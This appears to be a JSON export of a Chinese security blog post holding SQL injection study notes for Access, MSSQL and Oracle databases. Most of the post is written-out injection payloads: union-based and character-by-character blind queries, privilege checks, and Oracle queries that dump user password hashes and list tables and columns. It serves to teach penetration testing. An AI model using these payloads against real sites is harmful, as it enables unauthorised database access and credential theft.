{"title":"SQL注入-Oracle等注入","uid":"11c6b3c7b164ff24fb9d530dce97a986","slug":"SQL注入-Oracle等注入","date":"2022-02-07T10:57:10.000Z","updated":"2022-02-13T15:39:28.635Z","comments":true,"path":"api/articles/SQL注入-Oracle等注入.json","keywords":null,"cover":[],"content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>[TOC]</p>\n<p>##数据库注入</p>\n<p>除Access数据库之外，其他类型数据库注入流程：</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-Oracle%E7%AD%89%E6%B3%A8%E5%85%A5.htm/image-20220207191425163.png\" alt=\"image-20220207191425163\"></p>\n<p><strong>什么决定网站注入点的用户权限？</strong></p>\n<p><strong>SQL的配置文件用户名</strong></p>\n<hr>\n<h2 id=\"Access注入（特殊）\"><a href=\"#Access注入（特殊）\" class=\"headerlink\" title=\"Access注入（特殊）\"></a>Access注入（特殊）</h2><p>####Access数据结构</p>\n<p>​               表名</p>\n<p>​                       列名</p>\n<p>​                               数据</p>\n<p><strong>注意</strong>：1、Access数据库只有一个数据库；</p>\n<p>​            2、 <strong>Access数据库只能靠暴力猜解</strong>；</p>\n<p>​            3、 一般Access数据库与ASP网站一起搭建；</p>\n<p>​            4、 Access没有数据库名，没有版本号，统统都没有；</p>\n<p>​            5、 注入的时候无需查询什么版本等等。</p>\n<p>​            6、 access无注释符</p>\n<h4 id=\"注入方法：\"><a href=\"#注入方法：\" class=\"headerlink\" title=\"注入方法：\"></a>注入方法：</h4><p>1、联合查询法</p>\n<p>2、逐字猜解法（常用）</p>\n<h5 id=\"联合注入：\"><a href=\"#联合注入：\" class=\"headerlink\" title=\"联合注入：\"></a>联合注入：</h5><p><strong>第一步</strong>：判断注入点</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">?id&#x3D;1 and 1&#x3D;1返回正常\n?id&#x3D;1 and 1&#x3D;2返回错误’\n存在注入点。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>第二步</strong>：判断列的字段数</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">?id&#x3D;1 order by 3返回正常\n?id&#x3D;1 order by 4返回错误\n字段数为3<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>第三步</strong>：猜解表名（判断回显点）</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">?id&#x3D;1 union select 1,2,3 from 表名<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><strong>第四步</strong>：猜解列名</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">?id&#x3D;1 union select 1,列名一,列名二 from 表名\n猜出列名则会返回数据\n把上面得到的那两个数字中替换成表中的用户名与密码字段名：\n例：username 和 password<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>第五步</strong>：爆出数据</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">?id&#x3D;1 union select 1,admin,password from 表名\n回显点2爆出用户名，回显点3爆出密码<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n\n\n<p>#####逐字猜解法：（适用于 order by 不能用的地方）</p>\n<p><strong>第一步</strong>：判断注入点</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">?id&#x3D;1&#39; 单引号注入\n?id&#x3D;1 and 1&#x3D;1 数字型注入<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><strong>第二步</strong>：判断字段数</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">?id&#x3D;1 order by 3返回正常\n?id&#x3D;1 order by 4返回错误\n字段数为3<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>第三步</strong>：猜表名</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">?id&#x3D;1 and exists (select * from admin) ——猜表名<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><strong>第四步</strong>：猜列名</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">?id&#x3D;1 and exists (select username&#x2F;password from admin) ——猜列名<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><strong>第五步</strong>：猜字段中数据长度（1.确定长度 2.确定asc数据）</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">?id&#x3D;1 and (select top 1 len(username ) from admin)&gt;5  --判断长度\n?id&#x3D;1 and (select top 1 asc(mid(username ,1,1)) from admin(表名))&#x3D;97 判断字段第一位(后几位依次类推)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>top（附属查询）：</p>\n<p>例：top 1 用来返回第一行的内容（也可以用来限制返回内容的行数）</p>\n<hr>\n<h2 id=\"MSSQL-SQL-Server-注入\"><a href=\"#MSSQL-SQL-Server-注入\" class=\"headerlink\" title=\"MSSQL(SQL Server)注入\"></a>MSSQL(SQL Server)注入</h2><p><strong>常用框架组合方法ASP+MSSQL</strong></p>\n<p>1、判断数据库类型</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">and exists (select * from sysobjects)--返回正常为mssql（也名sql server）\nand exists (select count(*) from sysobjects)--有时上面那个语句不行就试试这个\n（sysobjects：MSSQL数据库特有的数据表，系统对象表）\n（Exists()：子语句查询，Exists方法返回一个布尔值，该布尔值指示在 Dictionary 对象中是否存在指定的 key，如果存在，返回 true，否则返回 false）<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>2、判断当前数据库</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">select db_name(N)  表示当前数据库，其中的参数表示第N个数据库，从0开始<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>3、查看所有数据库</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">SELECT top 1 Name FROM Master..SysDatabases  在系统数据库中能够查询所有的数据库\n（Master系统数据库）<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>4、注入点权限判断（根据页面显示效果）</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">1 select is_srvrolemember(&#39;sysadmin&#39;);判断当前是否为sa\n2 select is_srvrolemember(&#39;db_owner&#39;);判断当前用户写文件、读文件的权限（db_owner）\n3 select is_srvrolemember(&#39;public&#39;);  判断是否有public权限，可以爆破表<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>5、查看数据库版本</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">select @@version<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>6、查询表名</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">select top 1 name from test.sys.all_objects where type&#x3D;&#39;U&#39; AND is_ms_shipped&#x3D;0  获取第一个表名<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>7、查询列名</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">select top 1 COLUMN_NAME from test.information_schema.columns where TABLE_NAME&#x3D;&#39;users&#39;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>8、获取字段数据</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">select top 1 username from users\nselect top 1 password from users<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<hr>\n<h2 id=\"Oracle注入\"><a href=\"#Oracle注入\" class=\"headerlink\" title=\"Oracle注入\"></a>Oracle注入</h2><p>引导：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">dual表，此表是Oracle数据库中的一个自带表，有说法这是一个虚拟表，也有的说是一个实表，它实际上位满足查询条件而产生\n\n与MySQL不同的是，在MySQL中查询语句可以直接是：select 1,2，但是在Oracle中就必须跟一个表名，如下：select * from dual\n\n涉及到的基本用法：\n\nselect * from all_tables 查询出所有的表\n\nselect * from user_tables 查询出当前用户的表\n\nselect * from all_tab_columns 查询出所有的字段\n\nselect * from user_tab_columns  查询出当前用户的字段\n\nselect * from v$version 查版本\n\nrownum&#x3D;1   (限制查询返回的总行数为一条)\n\n对于rownum来说它是oracle系统顺序分配为从查询返回的行的编号，返回的第一行分配的是1，第二行是2，依此类推，这个伪字段可以用于限制查询返回的总行数。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h4 id=\"注入语句：\"><a href=\"#注入语句：\" class=\"headerlink\" title=\"注入语句：\"></a>注入语句：</h4><p><strong>（Oracle 字符串区分大小写）</strong></p>\n<p>获取数据库版本：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> banner <span class=\"token keyword\">FROM</span> v$version <span class=\"token keyword\">WHERE</span> banner <span class=\"token operator\">LIKE</span> <span class=\"token string\">'Oracle%'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">SELECT</span> version <span class=\"token keyword\">FROM</span> v$instance<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>获取数据库系统版本：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> banner <span class=\"token keyword\">FROM</span> v$version <span class=\"token keyword\">where</span> banner <span class=\"token operator\">like</span> <span class=\"token string\">'TNS%'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>获取当前数据库用户：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">user</span> <span class=\"token keyword\">FROM</span> dual<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">select</span> SYS_CONTEXT<span class=\"token punctuation\">(</span><span class=\"token string\">'USERENV'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'CURRENT_USER'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> dual<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>获取当前用户权限：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> session_privs<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>获取所有数据库用户密码：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> name<span class=\"token punctuation\">,</span> password<span class=\"token punctuation\">,</span> spare4 <span class=\"token keyword\">from</span> sys<span class=\"token punctuation\">.</span><span class=\"token keyword\">user</span>$<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>获取DB文件路径：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> name <span class=\"token keyword\">FROM</span> V$DATAFILE<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>列出DBA账户：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">DISTINCT</span> grantee <span class=\"token keyword\">FROM</span> dba_sys_privs <span class=\"token keyword\">WHERE</span> ADMIN_OPTION <span class=\"token operator\">=</span> ‘YES’ <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>服务器监听IP：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> utl_inaddr<span class=\"token punctuation\">.</span>get_host_address <span class=\"token keyword\">from</span> dual<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>获取当前操作系统：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span>  dbms_utility<span class=\"token punctuation\">.</span>port_string <span class=\"token keyword\">FROM</span> dual<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">select</span> member <span class=\"token keyword\">from</span> v$logfile <span class=\"token keyword\">where</span> rownum<span class=\"token operator\">=</span><span class=\"token number\">1</span>  <span class=\"token comment\">//路径也是可以判断的</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>获取服务器SID：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> instance_name <span class=\"token keyword\">from</span> v$instance<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>列出数据库：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">DISTINCT</span> owner <span class=\"token keyword\">FROM</span> all_tables<span class=\"token punctuation\">;</span> — 列出数据库 <span class=\"token punctuation\">(</span>一个用户一个<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><strong>联合注入语句</strong>：</p>\n<p><strong>（Oracle区分大小写）</strong></p>\n<p>判断字段：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">order</span> <span class=\"token keyword\">by</span>\n<span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span><span class=\"token string\">'null'</span> 根据<span class=\"token string\">''</span> 判断哪里是字符串<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>爆表:</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> table_name <span class=\"token keyword\">from</span> user_tables <span class=\"token keyword\">where</span> rownum<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> dual\n\n<span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> table_name <span class=\"token keyword\">from</span> user_tables <span class=\"token keyword\">where</span> rownum<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token operator\">and</span> table_name <span class=\"token operator\">not</span> <span class=\"token operator\">in</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'第一个表'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> dual<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>爆字段:</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> column_name <span class=\"token keyword\">from</span> user_tab_columns <span class=\"token keyword\">where</span> rownum<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token operator\">and</span> table_name<span class=\"token operator\">=</span><span class=\"token string\">'表名（大写的）'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> dual\n\n<span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> column_name <span class=\"token keyword\">from</span> user_tab_columns <span class=\"token keyword\">where</span> rownum<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token operator\">and</span> table_name<span class=\"token operator\">=</span><span class=\"token string\">'表名'</span> <span class=\"token operator\">and</span> column_name <span class=\"token operator\">not</span> <span class=\"token operator\">in</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'第一个字段'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> dual<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>爆数据:</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>字段<span class=\"token number\">1</span><span class=\"token operator\">||</span>字段<span class=\"token number\">2.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token operator\">||</span>字段n <span class=\"token keyword\">from</span> 表名 <span class=\"token keyword\">where</span> rownum<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token comment\">--</span>\n连接多个字段用到的连接符号是<span class=\"token operator\">||</span><span class=\"token punctuation\">,</span>在oracle数据库中，concat函数只能连接两个字符串<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>通过字段名查找对应的表：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> owner<span class=\"token punctuation\">,</span> table_name <span class=\"token keyword\">FROM</span> all_tab_columns <span class=\"token keyword\">WHERE</span> column_name <span class=\"token operator\">LIKE</span> <span class=\"token string\">'%USERNAME%'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>其盲注语句和OOB等，参考文章：<a href=\"https://www.cnblogs.com/R0ser1/p/15387539.html\">https://www.cnblogs.com/R0ser1/p/15387539.html</a></p>\n","text":"[TOC] ##数据库注入 除Access数据库之外，其他类型数据库注入流程： 什么决定网站注入点的用户权限？ SQL的配置文件用户名 Access注入（特殊）####Access数据结构 ​ 表名 ​ 列名 ​ 数据 注意：1、Access数据库只有一个数据库； ​ 2、 Ac...","link":"","photos":[],"count_time":{"symbolsCount":"4.4k","symbolsTime":"4 mins."},"categories":[{"name":"信息搜集","slug":"信息搜集","count":10,"path":"api/categories/信息搜集.json"}],"tags":[{"name":"信息搜集","slug":"信息搜集","count":11,"path":"api/tags/信息搜集.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Access%E6%B3%A8%E5%85%A5%EF%BC%88%E7%89%B9%E6%AE%8A%EF%BC%89\"><span class=\"toc-text\">Access注入（特殊）</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95%EF%BC%9A\"><span class=\"toc-text\">注入方法：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%EF%BC%9A\"><span class=\"toc-text\">联合注入：</span></a></li></ol></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#MSSQL-SQL-Server-%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">MSSQL(SQL Server)注入</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Oracle%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">Oracle注入</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%EF%BC%9A\"><span class=\"toc-text\">注入语句：</span></a></li></ol></li></ol></li></ol>","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"SQL注入-关键字过滤的注入","uid":"91c80453ca147ce2ce8eeaf9436ba64b","slug":"SQL注入-关键字过滤的注入","date":"2022-02-08T15:40:16.000Z","updated":"2022-02-13T15:39:14.145Z","comments":true,"path":"api/articles/SQL注入-关键字过滤的注入.json","keywords":null,"cover":[],"text":"[TOC] 关键字过滤的注入Less-23—Less-28a（Less-24除外）都是基于关键字过滤的注入，源码当中将--，#，or，and等关键字都过滤掉了，在这样的基础上进行 SQL注入。 Less-23由源码可以看到，接收到的id值将被函数preg_replace()进行过...","link":"","photos":[],"count_time":{"symbolsCount":"9.9k","symbolsTime":"9 mins."},"categories":[{"name":"SQL注入","slug":"SQL注入","count":20,"path":"api/categories/SQL注入.json"}],"tags":[{"name":"SQL注入","slug":"SQL注入","count":21,"path":"api/tags/SQL注入.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"POST注入-HTTP头注入","uid":"8d3782033a7b54632cfb455b67ca9836","slug":"POST注入-HTTP头注入","date":"2022-02-05T13:27:35.000Z","updated":"2022-02-13T15:31:36.278Z","comments":true,"path":"api/articles/POST注入-HTTP头注入.json","keywords":null,"cover":[],"text":"[TOC] 0x00原理：HTTP头中的参数带入到数据库被执行，造成了HTTP头注入。 $_SERVER详解$_SERVER['SCRIPT_NAME'] //当前脚本的路径 dirname($_SERVER['SCRIPT_NAME'] //dirname() 返回路径中的目录...","link":"","photos":[],"count_time":{"symbolsCount":"5.7k","symbolsTime":"5 mins."},"categories":[{"name":"SQL注入","slug":"SQL注入","count":20,"path":"api/categories/SQL注入.json"}],"tags":[{"name":"SQL注入","slug":"SQL注入","count":21,"path":"api/tags/SQL注入.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}